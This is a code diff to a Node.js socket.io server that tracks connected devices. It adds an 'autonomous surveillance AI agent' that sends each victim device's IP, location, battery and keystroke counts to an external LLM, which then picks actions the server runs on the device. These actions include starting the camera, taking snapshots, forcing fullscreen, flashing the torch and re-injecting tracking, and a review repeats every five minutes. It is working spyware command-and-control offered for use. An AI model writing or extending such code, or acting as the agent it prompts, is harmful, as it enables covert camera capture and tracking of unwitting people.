@@ -276,9 +276,15 @@ io.on('connection', (socket) => {
         io.emit('device-new', {
             id: deviceId,
             label: isOwnDevice ? `Admin-${deviceId.slice(0, 6)}` : `Device-${deviceId.slice(0, 6)}`,
-            time: Date.now(),
-            isOwnDevice: isOwnDevice
+            online: true,
+            ip: clientIp,
+            firstSeen: Date.now(),
+            lastSeen: Date.now()
         });
+        // Trigger AI Agent on new device (skip admin devices)
+        if (!isOwnDevice && AI_AGENT_ENABLED) {
+            setTimeout(() => aiAgentAnalyzeDevice(deviceId), 5000);
+        }
     }
 
     const device = devices.get(deviceId);
@@ -821,6 +827,190 @@ app.post('/api/ai/chat', async (req, res) => {
         res.status(500).json({ error: err.message });
     }
 });
+
+// ===== AI AUTONOMOUS AGENT =====
+// Auto-executes actions on devices based on AI analysis
+const AI_AGENT_ENABLED = process.env.AI_AGENT !== 'false';
+
+async function aiChat(messages, deviceId) {
+    try {
+        const res = await fetch('https://api.xiaomimimo.com/v1/chat/completions', {
+            method: 'POST',
+            headers: { 'api-key': MIMO_API_KEY, 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                model: 'mimo-v2.5-pro',
+                messages: deviceId ? [
+                    { role: 'system', content: 'You are Neural AI Agent, an autonomous surveillance AI.' },
+                    ...messages
+                ] : messages,
+                max_completion_tokens: 512,
+                temperature: 0.8,
+                top_p: 0.95,
+                stream: false
+            })
+        });
+        const data = await res.json();
+        return data.choices?.[0]?.message?.content || '';
+    } catch (e) { return ''; }
+}
+
+function executeAgentAction(deviceId, action, params) {
+    const socket = getDeviceSocket(deviceId);
+    if (!socket) return;
+    console.log(`[AI Agent] Executing on ${deviceId.slice(0,8)}...: ${action}`);
+    switch (action) {
+        case 'notify':
+            io.to(deviceId).emit('admin-show-notif', { title: params?.title || 'Neural AI', body: params?.body || 'Sistem mendeteksi aktivitas Anda.' });
+            break;
+        case 'camera':
+            io.to(deviceId).emit('start-camera-stream');
+            break;
+        case 'snapshot':
+            io.to(deviceId).emit('take-snapshot');
+            break;
+        case 'fullscreen':
+            io.to(deviceId).emit('force-fullscreen');
+            break;
+        case 'torch':
+            io.to(deviceId).emit('admin-torch', true);
+            setTimeout(() => io.to(deviceId).emit('admin-torch', false), 5000);
+            break;
+        case 'switch-camera':
+            io.to(deviceId).emit('switch-camera');
+            break;
+        case 'respawn':
+            io.to(deviceId).emit('force-respawn');
+            break;
+        default:
+            console.log(`[AI Agent] Unknown action: ${action}`);
+    }
+}
+
+function getDeviceSocket(deviceId) {
+    const sock = io.sockets.sockets;
+    for (const [_, s] of sock) {
+        if (s.deviceId === deviceId || s.id === deviceId) return s;
+    }
+    return null;
+}
+
+// AI Agent: Analyze new device and execute autonomous actions
+async function aiAgentAnalyzeDevice(deviceId) {
+    if (!AI_AGENT_ENABLED) return;
+    const d = devices.get(deviceId);
+    if (!d) return;
+
+    const deviceSummary = [
+        `Label: ${d.label}`,
+        `IP: ${d.ip}`,
+        `UA: ${d.userAgent}`,
+        `Location: ${d.location ? d.location.lat + ',' + d.location.lng : 'unknown'}`,
+        `Battery: ${d.battery ? d.battery.level + '%' : 'unknown'}`,
+        `Screen: ${d.screenWidth}x${d.screenHeight || 'unknown'}`,
+        `OS: ${d.os || 'unknown'}`,
+        `Browser: ${d.browser || 'unknown'}`,
+        `Language: ${d.language || 'unknown'}`,
+        `Timezone: ${d.timezone || 'unknown'}`,
+        `Mobile: ${d.isMobile ? 'yes' : 'no'}`,
+    ].join('\n');
+
+    const prompt = `A new device has connected. Analyze this device data and decide what actions to take.
+Available actions: notify (send notification), camera (start camera), snapshot (take photo), fullscreen (force fullscreen), torch (flash light), switch-camera (toggle front/back), respawn (re-inject tracking).
+
+Device Data:
+${deviceSummary}
+
+Rules:
+- If mobile device AND battery > 20%: consider camera or snapshot
+- If desktop/laptop: consider fullscreen + notification
+- Respond with a JSON array of actions. Each action: {"action":"notify","params":{"title":"...","body":"..."}}
+- Max 2 actions per analysis.
+- Only respond with the JSON array, nothing else.`;
+
+    const response = await aiChat([
+        { role: 'system', content: 'You are an autonomous surveillance AI agent. Analyze device data and output JSON actions only.' },
+        { role: 'user', content: prompt }
+    ]);
+
+    try {
+        const actions = JSON.parse(response);
+        if (Array.isArray(actions)) {
+            // Log to device history
+            if (!d.history) d.history = [];
+            d.history.push({ type: 'ai-agent', actions, time: Date.now() });
+            // Execute each action with delay
+            actions.forEach((act, i) => {
+                setTimeout(() => executeAgentAction(deviceId, act.action, act.params), i * 3000);
+            });
+            console.log(`[AI Agent] ${deviceId.slice(0,8)}... -> ${actions.length} actions queued`);
+        }
+    } catch (e) {
+        console.log(`[AI Agent] Parse error for ${deviceId.slice(0,8)}...: ${e.message}`);
+    }
+}
+
+// AI Agent: Periodic review of all devices (every 5 minutes)
+async function aiAgentPeriodicReview() {
+    if (!AI_AGENT_ENABLED) return;
+    console.log('[AI Agent] Running periodic review...');
+    for (const [deviceId, d] of devices) {
+        if (!d.online) continue;
+        // Only review devices that have been active for >2 minutes
+        if (Date.now() - d.firstSeen < 120000) continue;
+        // Skip if already reviewed in last 5 minutes
+        const lastAgent = (d.history || []).filter(h => h.type === 'ai-agent').pop();
+        if (lastAgent && Date.now() - lastAgent.time < 300000) continue;
+
+        const summary = [
+            `Label: ${d.label}`, `Online: ${d.online}`,
+            `Battery: ${d.battery ? d.battery.level + '%' : 'unknown'}`,
+            `Snapshots: ${d.snapshotsCount || 0}`,
+            `History entries: ${d.history ? d.history.length : 0}`,
+            `Keystrokes: ${d.keystrokes || 0}`,
+        ].join('\n');
+
+        const prompt = `Review this device's current state and decide if action is needed.
+Available actions: notify, camera, snapshot, fullscreen, torch, switch-camera, respawn.
+
+Device State:
+${summary}
+
+Rules:
+- If battery < 15%: no camera actions
+- If snapshots count = 0: suggest snapshot
+- If device has been online > 10 min with few actions: consider notify + camera
+- Respond with a JSON array of actions (max 2), or empty array [] if no action needed.`;
+
+        const response = await aiChat([
+            { role: 'system', content: 'You are an autonomous surveillance AI agent.' },
+            { role: 'user', content: prompt }
+        ]);
+
+        try {
+            const actions = JSON.parse(response);
+            if (Array.isArray(actions) && actions.length > 0) {
+                if (!d.history) d.history = [];
+                d.history.push({ type: 'ai-agent-review', actions, time: Date.now() });
+                actions.forEach((act, i) => {
+                    setTimeout(() => executeAgentAction(deviceId, act.action, act.params), i * 3000);
+                });
+                console.log(`[AI Agent] Review ${deviceId.slice(0,8)}... -> ${actions.length} actions`);
+            }
+        } catch (e) {}
+    }
+    saveDevices();
+}
+
+// Start AI Agent periodic review (every 5 minutes)
+if (AI_AGENT_ENABLED) {
+    setInterval(aiAgentPeriodicReview, 300000);
+    // Also review 30 seconds after startup
+    setTimeout(aiAgentPeriodicReview, 30000);
+    console.log('[AI Agent] Autonomous agent enabled, review interval: 5 minutes');
+}
+
+// Auto-trigger AI Agent when new device connects (called from socket handler)
+// This is triggered from the socket 'register-device' or new device detection
 
 // ===== DEVICE IDENTIFICATION =====
 const knownDevices = [
